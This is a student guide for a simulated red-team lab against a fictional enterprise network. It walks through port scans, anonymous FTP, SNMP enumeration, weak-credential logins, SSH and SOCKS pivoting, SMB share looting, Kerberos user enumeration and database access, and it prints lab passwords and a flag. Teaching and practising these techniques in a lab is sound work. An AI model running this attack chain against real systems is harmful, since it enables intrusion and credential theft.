# 🎯 Nexus Global Enterprise - Penetration Testing Student Lab Guide

Welcome to the **Nexus Global Enterprise Security Assessment**. In this lab, you will act as a Red Team penetration tester evaluating the defensive posture of a simulated multi-tier corporate network.

---

## 1. Engagement Rules of Engagement (RoE)

- **Target Organization:** Nexus Global Logistics & Enterprise Systems (`nexus.internal`)
- **Primary Objective:** Assess perimeter exposure, gain initial access, pivot through internal security boundaries, and retrieve the **Data Center Crown Jewels (Flags)**.
- **Flag Format:** `FLAG{...}`

---

## 2. Lab Scenarios

### 🅰️ Scenario 1: External Black-Box — Pure Network Pentesting (No Web App)
You have **Zero Prior Knowledge**. You attack using only network-level services — no web application exploitation.

**Entry Point:** External IP of the VPS (or `198.51.100.50` inside Docker).

**Phase 1 — External Port Scan:**
```bash
nmap -sV -sC -p 21,23,161,2222,5432,5060 <TARGET_IP>
nmap -sU -p 161 <TARGET_IP>          # SNMP (UDP)
```

**Phase 2 — Choose Your Entry Vector (pick one or all):**

**Option A — FTP Anonymous Login:**
```bash
ftp <TARGET_IP>                       # Login: anonymous / (blank)
ftp> ls                               # List files
ftp> get internal_network_map.txt     # Download network map
ftp> get infrastructure_report.txt   # Download audit report (contains all vuln details!)
```

**Option B — SNMP Enumeration:**
```bash
snmpwalk -v2c -c public <TARGET_IP>              # Full MIB walk
snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.4   # Network interfaces (leaks internal IPs)
snmp-check <TARGET_IP> -c public                  # Formatted output
```

**Option C — Telnet Weak Credentials:**
```bash
telnet <TARGET_IP>                    # Login: sysadmin / nexus123
$ cat /etc/hosts                      # Full internal network map
$ cat ~/scripts/monitor.sh            # Internal IPs + service list
$ cat ~/.ash_history                  # Previous commands
```

**Option D — PostgreSQL Weak Auth:**
```bash
psql -h <TARGET_IP> -U monitor -d monitoring_db   # Password: monitor123
\dt                                                # List tables
SELECT * FROM network_inventory;                   # Full internal host list
SELECT * FROM service_endpoints;                   # Vulnerabilities + hints
```

**Phase 3 — Pivot via Bastion SSH:**
```bash
# From the FTP/SNMP data you now know Bastion is at port 2222
ssh devops-remote@<TARGET_IP> -p 2222   # Password: devops-remote@123
# Now you are INSIDE the network!
```

**Phase 4 — Internal Enumeration & Crown Jewels:**
```bash
# From inside: enumerate SMB on AD DC
smbclient -L //10.0.2.10 -N
smbclient //10.0.2.10/IT-Backups -N -c "get sync_prod_db.sh"
cat sync_prod_db.sh                    # DB credentials!

# Access production database
psql -h 10.0.3.20 -U nexus_admin -d nexus_prod
SELECT * FROM system_vault_keys;       # FLAG{CR0WN_J3W3LS_DC_D4T4B4S3_C0MPR0M1S3D_2026!}
```

---

### 🅱️ Scenario 2: External Black-Box Penetration Test (Web Path)
You have **Zero Prior Knowledge**. You are given only the external perimeter IP address.

1. **Access Point:** Connect to your local pentest machine (e.g. Kali VM) and set up the tools as described in `docs/attacker_tools_guide.md`.
2. **Scope / Target:** `198.51.100.10` (or `10.0.1.10` via Edge Gateway).
3. **Milestones:**
   - [ ] **Phase 1 - Reconnaissance:** Discover exposed ports and running services on the perimeter.
   - [ ] **Phase 2 - Initial Foothold:** Exploit web application vulnerability on the DMZ Web Portal to gain command execution.
   - [ ] **Phase 3 - Network Pivoting:** Establish a tunnel / SOCKS proxy (e.g. using `chisel`, `socat`, or reverse shells) to route traffic through the DMZ host into the Core Backbone (`10.0.2.0/24`) and Data Center (`10.0.3.0/24`).
   - [ ] **Phase 4 - Active Directory Enumeration:** Query `nexus.internal` (`10.0.2.10`) for domain accounts and readable SMB shares.
   - [ ] **Phase 5 - Crown Jewels:** Access Data Center Database (`10.0.3.20`) or Intranet ERP (`10.0.3.10:8000`) and extract production database secrets.

---

### 🅱️ Scenario 2: Gray-Box / Assumed Breach (Campus Insider)
You start with low-privilege access on an internal campus workstation.

1. **Access Point:**
   - DevOps Workstation:
     ```bash
     docker exec -it nexus-pc-dev-01 bash
     # User: tahmed | Pass: DevOpsP@ss2026!
     ```
   - HR Workstation:
     ```bash
     docker exec -it nexus-pc-hr-01 bash
     # User: sjenkins | Pass: HrDirector9921!
     ```
2. **Milestones:**
   - [ ] Inspect local environment, user privileges, and bash history.
   - [ ] Discover internal shares on the Active Directory Domain Controller (`10.0.2.10`).
   - [ ] Find hardcoded infrastructure database credentials in internal scripts.
   - [ ] Authenticate directly to the production PostgreSQL cluster (`10.0.3.20`).

---

## 3. Useful Tools Available in Attacker Box

| Tool | Purpose / Example Usage |
| :--- | :--- |
| **Nmap** | `nmap -sS -sV -p- 198.51.100.10` |
| **Curl** | `curl -i http://198.51.100.10/` |
| **Smbclient** | `smbclient -L //10.0.2.10 -N` |
| **PostgreSQL Client** | `psql -h 10.0.3.20 -U nexus_admin -d nexus_prod` |
| **Impacket Tools** | `GetNPUsers.py nexus.internal/ -no-pass -dc-ip 10.0.2.10` |

---

## 4. Assessment Deliverables

Submit a brief Penetration Testing Report containing:
1. Executive Summary & Risk Level.
2. Step-by-step Attack Chain (Screenshots & Command Logs).
3. Retrieved Flags and Exposed Credentials.
4. Remediation Recommendations for Network Defense.
